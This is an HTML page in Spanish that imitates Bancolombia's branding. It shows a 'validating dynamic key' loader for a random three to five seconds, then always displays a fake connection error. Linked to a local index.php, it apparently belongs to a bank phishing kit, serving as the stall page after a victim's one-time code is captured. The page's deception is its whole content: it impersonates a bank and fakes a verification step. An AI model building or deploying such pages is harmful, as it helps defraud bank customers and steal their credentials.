<!DOCTYPE html>
<html lang="es">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
	<title>Bancolombia</title>
	<link rel="stylesheet" href="css/estilos.css">


	<script>
    window.addEventListener("load", function() {
      var loading = document.getElementById("loading");

      var tiempoAleatorio = Math.floor(Math.random() * (5000 - 3000 + 1)) + 3000;

      setTimeout(function() {
        loading.style.display = "none";
      }, tiempoAleatorio);
    });
  </script>


</head>
<body>

	<div id="loading">
    <div>
      <img src="img/loader.gif" alt="Loading">
    </div>
    <br>
    <h1 class="rdm-tarjeta--titulo-largo" style="color: #2c2A29; font-weight: 500; font-size: 1em; font-family: 'OpenSans-Regular', Arial, sans-serif; letter-spacing: -.3px; margin-top: 0em; text-align: center;">Validando Clave <br>Dinámica...</h1>
 </div>

<br>

<div align="center">

	<br>
	<br>

	<a href="index.php"><img src="img/logo.png" style="width: 2.5em;"></a>

	<br>
	<br>

</div>

<main class="rdm--contenedor-toolbar" style="margin-top: -1em;">



	<div align="center" style="height: 90%; display: block;">

		<br>
		<br>
		<br>
		<br>
		 <br>
     <br>

		<div style="width: 95%">
			<img src="img/img_error.jpeg" alt="" style="width: 70%">
		</div>

<br>
		<br>
		<br>
		<br>
		 <br>
     <br>


		<h1 class="rdm-tarjeta--titulo-largo" style="color: #2c2A29; font-weight: 500; font-size: 1.1em; font-family: 'OpenSans-Regular', Arial, sans-serif; letter-spacing: -.3px; margin-top: 0em">En este momento tenemos problemas de conexión.Inténtalo más tarde.</h1>



	<br>


	<a href="index.php">

    <p class="rdm-formularios--submit"><button type="submit" class="rdm-boton--resaltado" style="width: 100%; font-size: 1.2em; background: #fff; width: 95%; border: solid 1px black">INTÉNTALO MÁS TARDE</button></p>

    </a>

    </div>
     <br>






</main>




</body>
</html>